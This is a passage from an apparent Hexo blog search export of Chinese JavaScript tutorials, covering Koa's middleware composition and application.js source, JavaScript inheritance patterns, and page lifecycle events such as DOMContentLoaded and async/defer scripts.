<p>这里假设我们有两个中间件函数，我们首先取到第一个中间件函数并将其赋值给fn变量，判断条件不成立，继续执行，返回一个promise，但是这个resolve方法的操作数是一个fn函数调用的结果，因此我们需要调用fn函数，并且将fn函数的返回结果传递到resolve方法中。而fn函数就是我们在app.use中传入的中间件函数，于是开始调用第一个中间件函数，执行中间件函数中的代码，如果遇到了await next()，那么我们就调用传入的next方法，而中间件函数中的next参数就是我们这里传入的<code>dispatch.bind(null, i + 1)</code>函数，于是下一轮的dispatch函数就开始了它的生命周期。</p>
<p>此时dispatch函数中的参数index和i均为1，而相应的fn函数也变成了第二个中间件函数。类似于上面的过程，我们依然返回了一个promise对象，且由于resolve方法的参数为fn函数调用的结果，我们则首先需要调用fn函数，也就是第二个中间件函数的函数体。在此过程中，我们既可以写<code>await next()</code>，也可以不写。</p>
<p>假如我们写了<code>await next()</code>，那么dispatch函数会再一次调用，并且传入的i参数又加1，此时变为2。于是我们调用<code>dispatch(2)</code>。但是此时判定条件成立，于是返回了一个空的promise对象，返回之后，我们继续上一轮fn函数next调用下面的函数内容，直至执行完毕。</p>
<p>此时第二个中间件函数体已然执行完毕，则第一次调用的resolve方法中的参数fn函数中的next部分就执行完毕，于是开始执行next调用下面的内容了，直至函数执行完毕，resolve中的操作数计算完成，此时就可以执行application.js中then方法中的handleResponse了。</p>
<p>总的来说，就是通过promise控制了中间件的调用流程，形成了一种类似栈方式的中间件调用，而本质还是通过递归实现的。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Koa.js</tag>
      </tags>
  </entry>
  <entry>
    <title>阅读koa源码之application</title>
    <url>/2019/02/14/%E9%98%85%E8%AF%BBkoa%E6%BA%90%E7%A0%81%E4%B9%8Bapplication/</url>
    <content><![CDATA[<h1 id="阅读Koa-js源码之application"><a href="#阅读Koa-js源码之application" class="headerlink" title="阅读Koa.js源码之application"></a>阅读Koa.js源码之application</h1><p>application.js是整个koajs的入口文件，对外暴露的是一个<code>Application</code>类，下面以一段代码作为演示分析koa执行过程。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 首先引入koa，这个对应的Koa就是application对外暴露的Application类。</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="comment">// app作为Application类的实例，拥有use，listen方法</span></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.body = <span class="string">'Hello World'</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<h2 id="use实现"><a href="#use实现" class="headerlink" title="use实现"></a>use实现</h2><a id="more"></a>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">use(fn) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">'function'</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'middleware must be a function!'</span>);</span><br><span class="line">    <span class="keyword">if</span> (isGeneratorFunction(fn)) &#123;</span><br><span class="line">      deprecate(<span class="string">'Support for generators will be removed in v3. '</span> +</span><br><span class="line">                <span class="string">'See the documentation for examples of how to convert old middleware '</span> +</span><br><span class="line">                <span class="string">'https://github.com/koajs/koa/blob/master/docs/migration.md'</span>);</span><br><span class="line">      fn = convert(fn);</span><br><span class="line">    &#125;</span><br><span class="line">    debug(<span class="string">'use %s'</span>, fn._name || fn.name || <span class="string">'-'</span>);</span><br><span class="line">    <span class="keyword">this</span>.middleware.push(fn);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>use方法的参数一定要是个函数，并且如果为generator函数，此处会利用convert函数做转换，但是koa 3就不再支持generator函数了。此外application实例拥有一个middleware数组，每当我们调用app.use方法，就会将当前中间件函数push进这个application实例的middleware数组，最后我们返回this实例，因此我们可以链式在application实例上调用方法。</p>
<p>经过分析知，这一步我们只是在application的实例的middleware数组属性上增加了一个item。</p>
<h2 id="listen实现"><a href="#listen实现" class="headerlink" title="listen实现"></a>listen实现</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">listen(...args) &#123;</span><br><span class="line">    debug(<span class="string">'listen'</span>);</span><br><span class="line">    <span class="keyword">const</span> server = http.createServer(<span class="keyword">this</span>.callback());</span><br><span class="line">    <span class="keyword">return</span> server.listen(...args);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>listen方法接受任意数量参数，利用了ES6的rest parameters特性，在函数体内作为数组体现。可以看到，listen方法不过是http.createServer(app.callback()).listen(…args)的语法糖。我们创建了一个server实例，并传递this.callback()作为请求监听器，然后通过调用server实力的listen方法，返回了一个server实例。</p>
<p><strong>TODO: compose源码阅读</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">callback() &#123;</span><br><span class="line">    <span class="comment">// 接收context对象的函数</span></span><br><span class="line">    <span class="keyword">const</span> fn = compose(<span class="keyword">this</span>.middleware);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.listenerCount(<span class="string">'error'</span>)) <span class="keyword">this</span>.on(<span class="string">'error'</span>, <span class="keyword">this</span>.onerror);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> handleRequest = <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 每次请求重新创建context</span></span><br><span class="line">      <span class="comment">// 并传入node原生的req和res对象</span></span><br><span class="line">      <span class="keyword">const</span> ctx = <span class="keyword">this</span>.createContext(req, res);</span><br><span class="line">      <span class="comment">// 实际处理请求的方法，传入ctx对象以及中间件compose之后的函数</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.handleRequest(ctx, fn);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handleRequest;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>listen</code>方法调用了application实例的callback方法。与callback方法相关的有三个函数，分别是compose（从koa-compose包引入），createContext和handleRequest函数。compose函数接受一个中间件数组并返回一个函数，返回的这个函数接受一个context对象和一个next参数并返回一个promise。此时我们定义了一个handleRequest函数，<strong>这个函数就是作为createServer的请求监听器参数传入的</strong>。而这个handleRequest通过<strong>调用createContext创建了一个ctx对象</strong>，并将其和通过compose生成的fn传入了application实例的handleRequest方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">createContext(req, res) &#123;</span><br><span class="line">    <span class="comment">// 定义的context局部变量就是合成的ctx对象，我们在中间件中访问的context对象就是这个对象</span></span><br><span class="line">    <span class="comment">// 首先继承了实例属性context，实例属性继承了同文件夹下context.js文件暴露的对象</span></span><br><span class="line">    <span class="keyword">const</span> context = <span class="built_in">Object</span>.create(<span class="keyword">this</span>.context);</span><br><span class="line">    <span class="comment">// 定义koa的request对象，继承自实例属性request，实例属性request继承自同文件夹下的request文件暴露的对象，建立起了koa中context和request，response对象的关联</span></span><br><span class="line">    <span class="keyword">const</span> request = context.request = <span class="built_in">Object</span>.create(<span class="keyword">this</span>.request);</span><br><span class="line">    <span class="comment">// response同理</span></span><br><span class="line">    <span class="keyword">const</span> response = context.response = <span class="built_in">Object</span>.create(<span class="keyword">this</span>.response);</span><br><span class="line">    <span class="comment">// koa的context对象和request，response对象上的app属性均为app实例</span></span><br><span class="line">    context.app = request.app = response.app = <span class="keyword">this</span>;</span><br><span class="line">    <span class="comment">// context和request，response对象的req属性均为原生nodejs的req对象</span></span><br><span class="line">    context.req = request.req = response.req = req;</span><br><span class="line">    <span class="comment">// 同理</span></span><br><span class="line">    context.res = request.res = response.res = res;</span><br><span class="line">    <span class="comment">// koa的request和response对象的ctx属性均为此处创建的context对象，也是最终合成的context对象</span></span><br><span class="line">    request.ctx = response.ctx = context;</span><br><span class="line">    <span class="comment">// koa中request对象的response属性为koa中的response对象</span></span><br><span class="line">    request.response = response;</span><br><span class="line">    <span class="comment">// 同理</span></span><br><span class="line">    response.request = request;</span><br><span class="line">    <span class="comment">// context和request对象均可通过originalUrl获取到req.url，也就是不带域名协议端口号剩下的请求路径</span></span><br><span class="line">    context.originalUrl = request.originalUrl = req.url;</span><br><span class="line">    <span class="comment">// 在context对象上设置一个state对象，用于开发中存储有用的信息</span></span><br><span class="line">    context.state = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 最终将这个context对象返回，并供handleRequest使用</span></span><br><span class="line">    <span class="keyword">return</span> context;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">handleRequest(ctx, fnMiddleware) &#123;</span><br><span class="line">    <span class="comment">// 通过ctx.res获取到原生node的res对象</span></span><br><span class="line">    <span class="keyword">const</span> res = ctx.res;</span><br><span class="line">    <span class="comment">// 设置默认状态码为404</span></span><br><span class="line">    res.statusCode = <span class="number">404</span>;</span><br><span class="line">    <span class="comment">// 定义promise中出现错误时的callback函数</span></span><br><span class="line">    <span class="keyword">const</span> onerror = <span class="function"><span class="params">err</span> =&gt;</span> ctx.onerror(err);</span><br><span class="line">    <span class="comment">// 定义处理响应的函数</span></span><br><span class="line">    <span class="keyword">const</span> handleResponse = <span class="function"><span class="params">()</span> =&gt;</span> respond(ctx);</span><br><span class="line">    <span class="comment">// 当res发生错误时调用onerror回调</span></span><br><span class="line">    onFinished(res, onerror);</span><br><span class="line">    <span class="comment">// 调用compose之后的fn函数并传入ctx对象，返回的是个promise，调用其then方法处理响应结果</span></span><br><span class="line">    <span class="keyword">return</span> fnMiddleware(ctx).then(handleResponse).catch(onerror);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Response helper.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">respond</span>(<span class="params">ctx</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// allow bypassing koa</span></span><br><span class="line">  <span class="comment">// 当ctx.respond设置为false则绕过koa中的相应处理，也就是当前函数。</span></span><br><span class="line">  <span class="comment">// 当不想koa帮自己处理响应的时候使用，并不被koa官方推荐</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span> === ctx.respond) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// ctx的writable属性为false时，也不进行处理，该属性通过delegates委托到了koa的response对象中</span></span><br><span class="line">  <span class="keyword">if</span> (!ctx.writable) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取原生res对象，代理的response对象的body属性和status属性，这两个属性可以读写</span></span><br><span class="line">  <span class="keyword">const</span> res = ctx.res;</span><br><span class="line">  <span class="keyword">let</span> body = ctx.body;</span><br><span class="line">  <span class="keyword">const</span> code = ctx.status;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ignore body</span></span><br><span class="line">  <span class="comment">// statuses.empty是一个对象，包含204（no content），205（reset content），304（not modified）三个属性且对应值均为true</span></span><br><span class="line">  <span class="keyword">if</span> (statuses.empty[code]) &#123;</span><br><span class="line">    <span class="comment">// strip headers</span></span><br><span class="line">    <span class="comment">// 将响应体设置为body</span></span><br><span class="line">    ctx.body = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 标志响应结束</span></span><br><span class="line">    <span class="keyword">return</span> res.end();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="string">'HEAD'</span> == ctx.method) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!res.headersSent &amp;&amp; isJSON(body)) &#123;</span><br><span class="line">      ctx.length = Buffer.byteLength(<span class="built_in">JSON</span>.stringify(body));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.end();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// status body</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">null</span> == body) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.req.httpVersionMajor &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">      body = <span class="built_in">String</span>(code);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      body = ctx.message || <span class="built_in">String</span>(code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!res.headersSent) &#123;</span><br><span class="line">      ctx.type = <span class="string">'text'</span>;</span><br><span class="line">      ctx.length = Buffer.byteLength(body);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.end(body);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// responses</span></span><br><span class="line">  <span class="keyword">if</span> (Buffer.isBuffer(body)) <span class="keyword">return</span> res.end(body);</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">'string'</span> == <span class="keyword">typeof</span> body) <span class="keyword">return</span> res.end(body);</span><br><span class="line">  <span class="keyword">if</span> (body <span class="keyword">instanceof</span> Stream) <span class="keyword">return</span> body.pipe(res);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// body: json</span></span><br><span class="line">  body = <span class="built_in">JSON</span>.stringify(body);</span><br><span class="line">  <span class="keyword">if</span> (!res.headersSent) &#123;</span><br><span class="line">    ctx.length = Buffer.byteLength(body);</span><br><span class="line">  &#125;</span><br><span class="line">  res.end(body);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>koa.js</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象</title>
    <url>/2018/01/08/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p>面向对象类包含</p>
<ul>
<li>类和实例</li>
<li>类和继承</li>
</ul>
<a id="more"></a>

<h3 id="类的声明"><a href="#类的声明" class="headerlink" title="类的声明"></a>类的声明</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类的声明</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ES6中的class声明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal2</span> () </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> () &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="通过类实例化对象"><a href="#通过类实例化对象" class="headerlink" title="通过类实例化对象"></a>通过类实例化对象</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//打印上方实例化后的两个对象</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Animal(), <span class="keyword">new</span> Animal2())</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//借构造函数继承</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name=<span class="string">'parent1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent1.call(<span class="keyword">this</span>);<span class="comment">// apply,相当于在这里执行了Parent1构造函数的内容</span></span><br><span class="line">  <span class="keyword">this</span>.type=<span class="string">'child1'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造函数的继承不会继承父类原型对象上的方法，存在一定的缺陷。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 借助原型链实现继承</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent2'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.type=<span class="string">'child2'</span>;</span><br><span class="line">&#125;</span><br><span class="line">Child2.prototype = <span class="keyword">new</span> Parent2();</span><br></pre></td></tr></table></figure>
<p>Child2的实例都共享一个原型对象就是Parent2的这个实例，是这种继承的缺点</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 组合方式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent3</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent3'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent3.call(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child3'</span>;</span><br><span class="line">&#125;</span><br><span class="line">Child3.prototype = <span class="keyword">new</span> Parent3();</span><br></pre></td></tr></table></figure>
<p>构造函数执行两次，没必要。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 组合方式优化1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent4</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent4'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child4</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent3.call(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child4'</span>;</span><br><span class="line">&#125;</span><br><span class="line">Child4.prototype = Parent4.prototype;</span><br></pre></td></tr></table></figure>
<p>无法判断实例直接继承于谁，实例的constructor属性指向存在问题</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 组合方式优化2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent5</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent5'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child5</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent3.call(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child5'</span>;</span><br><span class="line">&#125;</span><br><span class="line">Child5.prototype = <span class="built_in">Object</span>.create(Parent5.prototype);</span><br><span class="line">Child5.prototype.constructor = Child5;</span><br></pre></td></tr></table></figure>
<hr>
<p>2018 年 1月 8日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>页面生命周期</title>
    <url>/2019/03/02/%E9%A1%B5%E9%9D%A2%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</url>
    <content><![CDATA[<h1 id="页面生命周期"><a href="#页面生命周期" class="headerlink" title="页面生命周期"></a>页面生命周期</h1><p>在一个网页加载的过程中，有三个重要的阶段以及与之对应的事件：</p>
<ul>
<li>DOMContentLoaded：HTML加载完成并构建了DOM树，但外部样式表资源或者图片资源等还尚未加载完成</li>
<li>load：加载了所有的外部资源</li>
<li>beforeunload/unload：用户将要离开页面时</li>
</ul>
<p>每一种事件因其所处的特殊阶段，具有不同的意义：</p>
<ul>
<li>DOMContentLoaded：DOM构建完成，处理函数可以查找DOM节点，初始化接口等</li>
<li>load：可以获取图片资源大小等（如果尚未在HTML/CSS中指定）</li>
<li>beforeunload/unload：询问用户是否保存了操作等<a id="more"></a>

</li>
</ul>
<h2 id="DOMContentLoaded"><a href="#DOMContentLoaded" class="headerlink" title="DOMContentLoaded"></a>DOMContentLoaded</h2><p>该事件发生在document对象上，需要用addEventListener来绑定监听函数。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">ready</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    alert(<span class="string">'DOM is ready'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// 图片资源还未加载，除非已经缓存过，否则这里应当获取的结果是0*0</span></span></span><br><span class="line"><span class="javascript">    alert(<span class="string">`Image size: <span class="subst">$&#123;img.offsetWidth&#125;</span>x<span class="subst">$&#123;img.offsetHeight&#125;</span>`</span>);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.addEventListener(<span class="string">"DOMContentLoaded"</span>, ready);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"img"</span> <span class="attr">src</span>=<span class="string">"https://en.js.cx/clipart/train.gif?speed=1&amp;cache=0"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DOMContentLoaded时间看上去虽然很简单，但是也有一些值得注意的地方。</p>
<h3 id="DOMContentLoaded和script的关系"><a href="#DOMContentLoaded和script的关系" class="headerlink" title="DOMContentLoaded和script的关系"></a>DOMContentLoaded和script的关系</h3><p>当浏览器解析HTML的时候遇到一个script标签，就会暂停对DOM的解析，转而执行js脚本，只有这样的script标签中的脚本执行完毕才会触发DOMContentLoaded事件。</p>
<p>通过src属性引入的外部脚步也会阻塞DOM的解析，因而DOMContentLoaded也会等待这些外部脚本加载执行完毕。</p>
<p>唯一例外的是带有async和defer属性的外部脚本。</p>
<h4 id="带有async和defer的外部脚本"><a href="#带有async和defer的外部脚本" class="headerlink" title="带有async和defer的外部脚本"></a>带有async和defer的外部脚本</h4><p>async和defer只适用于外部脚本，如果script标签没有src属性，即便设置async和defer也会自动忽略。</p>
<p>这两个属性都告诉浏览器可以继续解析DOM，而在后台去加载和解析JS文件。</p>
<p>async和defer也有一些不同的特性：</p>
<p>首先是运行的顺序，对于async加载的脚本而言，遵循先加载的先运行原则，而defer加载的脚本严格按照document中定义的先后次序来执行。</p>
<p>然后是和DOMContentLoaded事件的关系，对于async加载的脚本，可能会在document还没有完全下载完成之前就执行了，适用于document很长，而脚本文件很小或者已经被缓存过的情况；而defer加载的脚本会等待document加载和解析完成才会执行，如果有必要还会等待，并且正好是在DOMContentLoaded事件发生之前去执行。</p>
<p>由于它们特性的不同，所适用的场景也不同：</p>
<ul>
<li>async适用于一个个的独立的脚本，比如计数器或者广告，它们不需要获取页面内容，并且相对执行序也没什么所谓</li>
<li>defer适用于需要使用DOM的脚本并且相对执行序重要的场景</li>
</ul>
<h3 id="DOMContentLoaded和style的关系"><a href="#DOMContentLoaded和style的关系" class="headerlink" title="DOMContentLoaded和style的关系"></a>DOMContentLoaded和style的关系</h3><p>外部样式表不影响DOM，所以按理说DOMContentLoaded也无需等待它们的加载，但是有一个陷阱。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">// the script doesn't not execute until the stylesheet is loaded</span></span></span><br><span class="line"><span class="javascript">  alert(getComputedStyle(<span class="built_in">document</span>.body).marginTop);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果我们在link标签之后紧跟着一个script标签，那么DOMContentLoaded要被外部样式表的加载所阻塞，因为向上面的例子一样，script可能要获取依赖样式的信息，因为script会阻塞DOMContentLoaded，所以link这里也要去等待它执行完成。</p>
<h3 id="浏览器的自动填充"><a href="#浏览器的自动填充" class="headerlink" title="浏览器的自动填充"></a>浏览器的自动填充</h3><p>你可能注意到，有时候浏览器的自动填充密码会有个小小的延迟，这是因为这种autofill是监听DOMContentLoaded事件导致的，因为脚本的加载可能阻塞该事件的触发，所以有时会有一个延迟。</p>
<p>这时也体现了async和defer的好处，我们通过设置async和defer，让脚本不阻塞该事件的触发，这样也能尽早地进行表单的自动填充。</p>
<h2 id="load事件"><a href="#load事件" class="headerlink" title="load事件"></a>load事件</h2><p>window上的load事件，会在整个页面所有资源加载完毕后触发，如图片样式等。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">    alert(<span class="string">'Page loaded'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// image is loaded at this time</span></span></span><br><span class="line"><span class="javascript">    alert(<span class="string">`Image size: <span class="subst">$&#123;img.offsetWidth&#125;</span>x<span class="subst">$&#123;img.offsetHeight&#125;</span>`</span>);</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"img"</span> <span class="attr">src</span>=<span class="string">"https://en.js.cx/clipart/train.gif?speed=1&amp;cache=0"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一次我们就能获取到正确的图片的长宽了。</p>
<h2 id="unload事件"><a href="#unload事件" class="headerlink" title="unload事件"></a>unload事件</h2><p>只在用户离开页面的时候触发，只能做一些不涉及延迟或者询问用户的事情，因为这个原因很少使用</p>
<h2 id="beforeunload事件"><a href="#beforeunload事件" class="headerlink" title="beforeunload事件"></a>beforeunload事件</h2><p>在用户想要离开页面之前触发，如果处理函数返回一个字符串，会在用户离开时进行弹窗询问是否真的想离开。</p>
<h2 id="readyState"><a href="#readyState" class="headerlink" title="readyState"></a>readyState</h2><p>有时候不确定页面是否已经成功加载，比如说设置了async和defer的外部脚本，因此我们需要确切的知道document当前的state。这是我们使用document的readyState属性，该属性可以是如下值：</p>
<ul>
<li>loading：document正在加载</li>
<li>interactive：document已经读取完毕</li>
<li>complete：外部资源也已都加载完成</li>
</ul>
<p>当state发生改变的时候，会触发readystatechange事件，这是个历史遗留产物，现在已很少使用。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>DOM</tag>
        <tag>event</tag>
      </tags>
  </entry>
</search>
